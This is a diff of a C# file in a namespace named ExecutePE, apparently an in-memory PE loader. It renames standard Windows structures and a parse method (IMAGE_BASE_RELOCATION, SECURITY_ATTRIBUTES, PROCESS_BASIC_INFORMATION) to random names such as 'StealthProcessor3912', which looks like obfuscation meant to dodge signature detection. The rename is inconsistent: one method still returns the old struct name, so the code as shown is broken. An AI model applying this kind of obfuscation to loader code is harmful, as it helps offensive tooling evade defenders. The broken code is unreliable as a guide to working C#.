@@ -30,7 +30,7 @@ namespace ExecutePE
         internal const uint IMAGE_SCN_MEM_READ = 0x40000000;
         internal const uint IMAGE_SCN_MEM_WRITE = 0x80000000;
 
-        public struct IMAGE_BASE_RELOCATION
+        public struct IntelligentDispatcherFE17
         {
             internal uint VirtualAddress;
             internal uint SizeOfBlock;
@@ -41,7 +41,7 @@ namespace ExecutePE
                 SizeOfBlock = sizeOfBlock;
             }
 
-            public static IMAGE_BASE_RELOCATION Parse(byte[] b)
+            public static IMAGE_BASE_RELOCATION CipherMonitor5B3E(byte[] b)
             {
                 var virtualAddress = BitConverter.ToUInt32(b, 0);
                 var sizeOfBlock = BitConverter.ToUInt32(b, 4);
@@ -70,7 +70,7 @@ namespace ExecutePE
         internal static extern IntPtr GetStdHandle(StdHandle nStdHandle);
 
         [StructLayout(LayoutKind.Sequential)]
-        internal struct SECURITY_ATTRIBUTES
+        internal struct StealthProcessor3912
         {
             internal int nLength;
             internal byte* lpSecurityDescriptor;
@@ -135,7 +135,7 @@ namespace ExecutePE
         internal static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
         [StructLayout(LayoutKind.Sequential)]
-        internal struct PROCESS_BASIC_INFORMATION
+        internal struct EnhancedAdapter0B10
         {
             internal uint ExitStatus;
             internal IntPtr PebAddress;
